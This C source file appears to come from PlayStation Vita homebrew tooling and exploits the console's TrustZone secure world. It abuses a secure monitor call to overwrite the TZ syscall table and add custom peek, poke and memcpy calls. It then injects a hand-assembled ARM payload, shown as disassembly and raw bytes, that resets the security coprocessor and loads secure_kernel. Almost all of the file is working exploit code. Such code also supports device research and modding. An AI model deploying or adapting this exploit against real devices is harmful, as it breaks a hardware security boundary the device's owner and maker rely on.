/*
 * Copyright (C) 2021 skgleba
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

#define SMC_PEEK				0x180
#define SMC_POKE				0x181
#define SMC_DACROFF_MEMCPY		0x182
#define SMC_FLUSH				0x183
#define SMC_CCODE		        0x184
#define SMC_FUDRESET		    0x185

#define TZ_SHARED 0x560000
#define TZ_SYSCALL 0x513000
#define TZ_PEEK 0xC30E5
#define TZ_POKE 0xCD03C
#define TZ_MEMCPY 0xC0000
#define TZ_FLUSH 0xCDC51
#define K_SHARED 0xE0000
#define TZ_MMU 0x8000
#define TZ_VA 0x35000000

/*
                             cmep_reset
        000d2738 38 b5           push       { r3, r4, r5, lr }
        000d273a 04 00           mov        r4,r0
        000d273c 01 00           mov        r1,r0
        000d273e 42 f2 9c 70     movw       r0,#0x279c
        000d2742 c0 f2 0d 00     movt       r0,#0xd
        000d2746 4e f6 49 75     movw       r5,#0xef49
        000d274a c0 f2 0c 05     movt       r5,#0xc
        000d274e a8 47           blx        r5=>probably_printf                              undefined probably_printf()
        000d2750 00 20           mov        r0,#0x0
        000d2752 ce f2 01 00     movt       r0,#0xe001
        000d2756 01 21           mov        r1,#0x1
        000d2758 01 60           str        r1,[r0,#0x0]=>DAT_e0010000
        000d275a 00 21           mov        r1,#0x0
        000d275c 01 60           str        r1,[r0,#0x0]=>DAT_e0010000
                             LAB_000d275e                                    XREF[1]:     000d2762(j)
        000d275e 01 68           ldr        r1,[r0,#0x0]=>DAT_e0010000
        000d2760 00 29           cmp        r1,#0x0
        000d2762 fc d1           bne        LAB_000d275e
                             LAB_000d2764                                    XREF[1]:     000d2768(j)
        000d2764 41 68           ldr        r1,[r0,#offset DAT_e0010004]
        000d2766 00 29           cmp        r1,#0x0
        000d2768 fc da           bge        LAB_000d2764
        000d276a 42 f2 c8 70     movw       r0,#0x27c8
        000d276e c0 f2 0d 00     movt       r0,#0xd
        000d2772 a8 47           blx        r5=>probably_printf                              undefined probably_printf()
        000d2774 4f f0 60 40     mov.w      r0,#0xe0000000
        000d2778 44 f0 01 01     orr        r1,r4,#0x1
        000d277c 01 61           str        r1,[r0,#offset DAT_e0000010]
                             LAB_000d277e                                    XREF[1]:     000d2786(j)
        000d277e 01 68           ldr        r1,[r0,#0x0]=>DAT_e0000000
        000d2780 02 29           cmp        r1,#0x2
        000d2782 01 d0           beq        LAB_000d2788
        000d2784 01 29           cmp        r1,#0x1
        000d2786 fa d1           bne        LAB_000d277e
                             LAB_000d2788                                    XREF[1]:     000d2782(j)
        000d2788 22 00           mov        r2,r4
        000d278a 0c 00           mov        r4,r1
        000d278c 42 f2 f4 70     movw       r0,#0x27f4
        000d2790 c0 f2 0d 00     movt       r0,#0xd
        000d2794 a8 47           blx        r5=>probably_printf                              undefined probably_printf()
        000d2796 44 f4 84 60     orr        r0,r4,#0x420
        000d279a 38 bd           pop        { r3, r4, r5, pc }
        000d279c 57 65 6c        ds         "Welcome to TZ(0x%X)!\nPerforming f00d reset\n"
                 63 6f 6d
                 65 20 74
        000d27c8 64 69 64        ds         "did reset, mode 0x%X\nloading secure_kernel\n"
                 20 72 65
                 73 65 74
        000d27f4 73 65 63        ds         "secure_kernel.enp(0x%X+1) load returned 0x%X\
                 75 72 65
                 5f 6b 65

                             custom_cry2arm0handler
        000d2838 30 b5           push       { r4, r5, lr }
        000d283a 4e f6 49 73     movw       r3,#0xef49
        000d283e c0 f2 0c 03     movt       r3,#0xc
        000d2842 4f f0 60 42     mov.w      r2,#0xe0000000
        000d2846 11 68           ldr        r1,[r2,#0x0]
        000d2848 42 f6 60 00     movw       r0,#0x2860
        000d284c c0 f2 0d 00     movt       r0,#0xd
        000d2850 0c 00           mov        r4,r1
        000d2852 15 00           mov        r5,r2
        000d2854 98 47           blx        r3
        000d2856 2c 60           str        r4,[r5,#0x0]
        000d2858 4f f0 ff 30     mov.w      r0,#0xffffffff
        000d285c 30 bd           pop        { r4, r5, pc }
        000d285e 00 bf           nop
        000d2860 66 75 64        ds         "fud crie0 0x%X\n"
                 20 63 72
                 69 65 30
*/
static const unsigned char tz_fudreset_sigma[] = {
0x38, 0xb5, 0x04, 0x00, 0x01, 0x00, 0x42, 0xf2, 0x9c, 0x70, 0xc0, 0xf2, 0x0d, 0x00, 0x4e, 0xf6,
0x49, 0x75, 0xc0, 0xf2, 0x0c, 0x05, 0xa8, 0x47, 0x00, 0x20, 0xce, 0xf2, 0x01, 0x00, 0x01, 0x21,
0x01, 0x60, 0x00, 0x21, 0x01, 0x60, 0x01, 0x68, 0x00, 0x29, 0xfc, 0xd1, 0x41, 0x68, 0x00, 0x29,
0xfc, 0xda, 0x42, 0xf2, 0xc8, 0x70, 0xc0, 0xf2, 0x0d, 0x00, 0xa8, 0x47, 0x4f, 0xf0, 0x60, 0x40,
0x44, 0xf0, 0x01, 0x01, 0x01, 0x61, 0x01, 0x68, 0x02, 0x29, 0x01, 0xd0, 0x01, 0x29, 0xfa, 0xd1,
0x22, 0x00, 0x0c, 0x00, 0x42, 0xf2, 0xf4, 0x70, 0xc0, 0xf2, 0x0d, 0x00, 0xa8, 0x47, 0x44, 0xf4,
0x84, 0x60, 0x38, 0xbd, 0x57, 0x65, 0x6c, 0x63, 0x6f, 0x6d, 0x65, 0x20, 0x74, 0x6f, 0x20, 0x54,
0x5a, 0x28, 0x30, 0x78, 0x25, 0x58, 0x29, 0x21, 0x0a, 0x50, 0x65, 0x72, 0x66, 0x6f, 0x72, 0x6d,
0x69, 0x6e, 0x67, 0x20, 0x66, 0x30, 0x30, 0x64, 0x20, 0x72, 0x65, 0x73, 0x65, 0x74, 0x0a, 0x00,
0x64, 0x69, 0x64, 0x20, 0x72, 0x65, 0x73, 0x65, 0x74, 0x2c, 0x20, 0x6d, 0x6f, 0x64, 0x65, 0x20,
0x30, 0x78, 0x25, 0x58, 0x0a, 0x6c, 0x6f, 0x61, 0x64, 0x69, 0x6e, 0x67, 0x20, 0x73, 0x65, 0x63,
0x75, 0x72, 0x65, 0x5f, 0x6b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x0a, 0x00, 0x73, 0x65, 0x63, 0x75,
0x72, 0x65, 0x5f, 0x6b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x2e, 0x65, 0x6e, 0x70, 0x28, 0x30, 0x78,
0x25, 0x58, 0x2b, 0x31, 0x29, 0x20, 0x6c, 0x6f, 0x61, 0x64, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72,
0x6e, 0x65, 0x64, 0x20, 0x30, 0x78, 0x25, 0x58, 0x0a, 0x61, 0x6c, 0x6c, 0x20, 0x64, 0x6f, 0x6e,
0x65, 0x2c, 0x20, 0x65, 0x78, 0x69, 0x74, 0x69, 0x6e, 0x67, 0x20, 0x73, 0x6d, 0x63, 0x0a, 0x00,
0x30, 0xb5, 0x4e, 0xf6, 0x49, 0x73, 0xc0, 0xf2, 0x0c, 0x03, 0x4f, 0xf0, 0x60, 0x42, 0x11, 0x68,
0x42, 0xf6, 0x60, 0x00, 0xc0, 0xf2, 0x0d, 0x00, 0x0c, 0x00, 0x15, 0x00, 0x98, 0x47, 0x2c, 0x60,
0x4f, 0xf0, 0xff, 0x30, 0x30, 0xbd, 0x00, 0xbf, 0x66, 0x75, 0x64, 0x20, 0x63, 0x72, 0x69, 0x65,
0x30, 0x20, 0x30, 0x78, 0x25, 0x58, 0x0a, 0x00
};

// use the write primitive to add read32 and write32 smcs
// code by Proxima
static int patch_tz_peekpoke(k_root* kroot) {
    void (*dcl2wbivr)(void* va, uint32_t sz) = KFUN("SceSysmem", 0x1b1d4 | 1);
    if (!dcl2wbivr)
        return -1;
    unsigned int* shared_mem = (unsigned int*)(K_SHARED);
    unsigned int handle;
    unsigned int ret, i;
    unsigned int index;
    unsigned int smc_id = 0x180;
    unsigned int tz_shared_mem = TZ_SHARED;
    unsigned int tz_syscall_table = TZ_SYSCALL;
    unsigned int tz_target_write_address = tz_syscall_table + ((smc_id - 0x100) * 4);
    kroot->memset(shared_mem, 0, 0x5000);

    shared_mem[0x28 / 4] = TZ_PEEK; // PEEK function 
    shared_mem[0x2C / 4] = TZ_POKE; // POKE function
    handle = tz_shared_mem;
    handle >>= 1;

    index = (tz_target_write_address - tz_shared_mem) >> 7;
    dcl2wbivr(shared_mem, 0x5000);
    __asm ("dmb sy");
    __asm ("dsb sy");
    ret = xsmc(handle, index, 0, 0, 0x12F);
    __asm ("dsb sy");
    __asm ("dmb sy");

    return ret;
}

int tz_dacroff_copyto(k_root* kroot, uint32_t tz_va_dst, void* ns_va_src, uint32_t sz) {
    void (*dcl2wbivr)(void* va, uint32_t sz) = KFUN("SceSysmem", 0x1b1d4 | 1);
    if (!dcl2wbivr)
        return -1;
    if (sz > 0x3000)
        return -2;
    void* tzns_cpybuf = (void*)(K_SHARED + 0x2000);
    kroot->memset(tzns_cpybuf, 0, sz);
    kroot->memcpy(tzns_cpybuf, ns_va_src, sz);

    dcl2wbivr(tzns_cpybuf, 0x3000); // dafuk
    __asm ("dmb sy");
    __asm ("dsb sy");
    int ret = xsmc(tz_va_dst, TZ_SHARED + 0x2000, sz, 0, SMC_DACROFF_MEMCPY);
    __asm ("dsb sy");
    __asm ("dmb sy");

    return ret;
}

// hack tz, add custom smcs, copy the tz payload
int tz_init(k_root* kroot) {
    if (!kroot)
        return -1;
    
    kroot->printf("[SNS][TZ] tz_init, adding peek/poke\n");
    
    int ret = patch_tz_peekpoke(kroot);
    kroot->printf("[SNS][TZ] patch_tz_peekpoke() 0x%X\n", ret);
    if (ret < 0)
        return ret;

    kroot->printf("[SNS][TZ] making new SMCs\n");
    xsmc(TZ_SYSCALL + ((SMC_FLUSH - 0x100) * 4), TZ_FLUSH, 0, 0, SMC_POKE);
    xsmc(TZ_SYSCALL + ((SMC_DACROFF_MEMCPY - 0x100) * 4), 0xcdeb1, 0, 0, SMC_POKE);
    xsmc(TZ_SYSCALL + ((SMC_FUDRESET - 0x100) * 4), 0xD2739, 0, 0, SMC_POKE);
    xsmc(TZ_SYSCALL + ((SMC_PEEK - 0x100) * 4), 0x100, 0, 0, SMC_FLUSH);

    kroot->printf("[SNS][TZ] adding fudreset\n");
    ret = tz_dacroff_copyto(kroot, 0xD2738, (void *)tz_fudreset_sigma, sizeof(tz_fudreset_sigma));
    kroot->printf("[SNS][TZ] tz_dacroff_copyto() 0x%X\n", ret);
    if (ret < 0)
        return ret;

    return 0;
}
